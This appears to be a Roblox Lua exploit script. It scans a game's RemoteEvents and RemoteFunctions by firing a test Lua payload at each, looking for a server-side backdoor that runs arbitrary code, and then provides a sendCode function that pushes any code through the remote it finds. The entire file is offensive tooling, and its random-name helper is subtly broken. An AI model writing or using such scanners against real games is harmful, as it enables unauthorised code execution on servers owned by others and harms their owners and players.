local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer

local function findBackdoor()
    local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    local function randomName(length)
        local name = ""
        for i = 1, length do
            local c = chars:sub(math.random(1, #chars), math.random(1, #chars))
            name = name .. c
        end
        return name
    end
    for _, parent in ipairs({Workspace, ReplicatedStorage, Players}) do
        for _, remote in ipairs(parent:GetDescendants()) do
            if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
                local testName = randomName(8)
                local payload = 'Instance.new("Model", workspace).Name="' .. testName .. '"'
                local ok
                if remote:IsA("RemoteEvent") then
                    ok = pcall(function() remote:FireServer(payload) end)
                else
                    ok = pcall(function() remote:InvokeServer(payload) end)
                end
                if ok then
                    task.wait(0.1)
                    local check = Workspace:FindFirstChild(testName)
                    if check then
                        check:Destroy()
                        return remote
                    end
                end
            end
        end
    end
    return nil
end

local function sendCode(code)
    local remote = findBackdoor()
    if remote and typeof(remote) == "Instance" then
        if remote:IsA("RemoteEvent") then
            pcall(function() remote:FireServer(code) end)
        elseif remote:IsA("RemoteFunction") then
            pcall(function() remote:InvokeServer(code) end)
        end
        return true
    else
        return false
    end
end

